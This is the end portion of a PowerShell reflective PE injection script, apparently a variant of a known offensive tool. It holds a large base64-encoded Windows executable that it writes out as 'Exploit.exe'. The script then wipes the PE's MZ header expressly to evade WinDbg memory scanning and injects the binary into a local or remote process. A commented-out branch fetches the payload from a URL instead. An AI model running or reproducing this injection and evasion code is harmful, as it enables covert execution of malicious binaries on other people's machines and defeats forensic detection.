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AAAAAAAAAAAAAAAHAJAUABAAAAAA4BQAEAAACADwFAAQAAACBrAUABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v///wAAAAD0nABAAQAAAPScAEABAAAA9JwAQAEAAAD0nABAAQAAAPScAEABAAAA9JwAQAEAAAD0nABAAQAAAPScAEABAAAA9JwAQAEAAAD0nABAAQAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHhyAUABAAAAIIgBQAEAAAAgiAFAAQAAACCIAUABAAAAIIgBQAEAAAAgiAFAAQAAACCIAUABAAAAIIgBQAEAAAAgiAFAAQAAACCIAUABAAAAf39/f39/f398cgFAAQAAACSIAUABAAAAJIgBQAEAAAAkiAFAAQAAACSIAUABAAAAJIgBQAEAAAAkiAFAAQAAAC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BUAABjVAAAqEsBAJRUAAADVwAAGE8BAAxXAABMVwAAqEsBAExXAAD4VwAAPE8BAPhXAAAwWAAARFEBADBYAABoWAAARFEBAGhYAABcWQAASE8BAGRZAADRWQAAYE8BANRZAABFWgAAbE8BALhaAADjWgAAqEsBAORaAAAwWwAAvE0BADBbAAAqXwAAvE0BADxfAABbXwAAvE0BAFxfAAB8XwAAvE0BAHxfAACZXwAAqEsBAJxfAAD/XwAAvE0BAABgAAAmYAAAqEsBAChgAACHYAAAqEsBAIhgAABpYQAAeE8BAGxhAABdaQAApE8BAGBpAABFagAAyE8BAEhqAADbagAAsEsBANxqAAAvawAAvE0BALxrAABSbQAAwEsBAPhtAABtbgAA9E8BAHBuAADSbgAARFEBANRuAAD8bgAAqEsBAPxuAAB5bwAAZFQBAHxvAAAKcAAAwEsBAAxwAADtcQAAiFABAPBxAACqcgAAFFABAKxyAADwdAAAOFABAPB0AACedwAAaFABAKB3AADjdwAAZFQBAOR3AAApeAAAZFQBAEB4AADoeAAAqFABAOh4AAByegAArFABAHR6AACIegAALE0BAIh6AADFegAAvFABAMh6AABHewAAxFABAEh7AADCewAAxFABAMR7AABFfAAAxFABAEh8AACBfAAARFEBAIR8AAAsfQAA3FABACx9AAB4fQAAvE0BAHh9AADxfQAAsEsBAAB+AADmfgAABFEBAOh+AAAsfwAARFEBACx/AACzfwAAwEsBALR/AABxgAAAUFEBAHSAAADVgAAAsEsBAACBAAAkgQAAeFEBADCBAABIgQAAgFEBAFCBAABRgQAAhFEBAGCBAABhgQAAiFEBAMCBAAANggAAjFEBAECCAABfggAAsFEBAGCCAAB9ggAAqEsBAICCAADDggAAvE0BAMSCAADOgwAA0FEBANCDAADngwAAqEsBAOiDAAAbhAAAvE0BAFyEAACPhgAAAFIBAJiGAAARhwAAMFIBACiHAACJhwAAvE0BAIyHAAARiAAAvE0BABSIAAB/iAAAvE0BAJyIAABoiQAAvE0BAGiJAADbiwAAQFIBANyLAAB0jAAAXFIBAHSMAAAejQAAxE0BACCNAACUjQAAqEsBAMCNAAARjwAAkFIBAByPAAB1jwAAEE0BAJCPAADejwAAqFIBAO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wAAACgoqiisKK4osCi2KLgouiiSKNQozilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKZ4poimmKYAAAAAAQAQAAAAyKPQo9ij4KMAEAEA6AEAAAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KHoofihCKIYoiiiOKJIoliiaKJ4ooiimKKooriiyKLYouii+KIIoxijKKM4o0ijWKNoo3ijiKOYo6ijuKPIo9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUYpSilOKVIpVilaKV4pYilmKWopbilyKXYpeil+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYp2ineKeIp5inqKe4p8in2Kfop/inCKgYqCioOKhIqFioaKh4qIiomKioqLioyKjYqOio+KgIqRipKKk4qUipWKloqXipiKmYqaipuKnIqdip6Kn4qQiqGKooqjiqSKpYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwAgAQC4AQAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKygrLCswKzQrOCs8KwArRCtIK0wrUCtUK1grXCtAEABAAwAAAAQpNiqAGABAOwAAAAYoCCgoKGwoQCrIKsoqzCrOKtAq0irUKtYq2CraKtwq3irgKuIq5CrmKugq6irsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rACtCK0QrRitIK0orTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitsK24rcCtyK3Qrdit4K0orkiuaK6Irqiu4K74rgCvCK8Qr1CvWK9gr2ivcK94r4CviK+Qr5ivAAAAcAEANAAAAOCh6KHwofihAKIIohCiGKIgoiiiOKJAokiiUKJYomCiaKJwooCiiKKQopiiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

		[Byte[]]$PEBytes = [System.Convert]::FromBase64String($InputString);
		[System.IO.FIle]::WriteAllBytes("Exploit.exe",$PEBytes)
	#}
	<#
	else
	{
		$WebClient = New-Object System.Net.WebClient
		
		[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
	}
	#>
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
	# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
    $PEBytes[0] = 0
    $PEBytes[1] = 0
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
Invoke-ReflectivePEInjection -Verbose
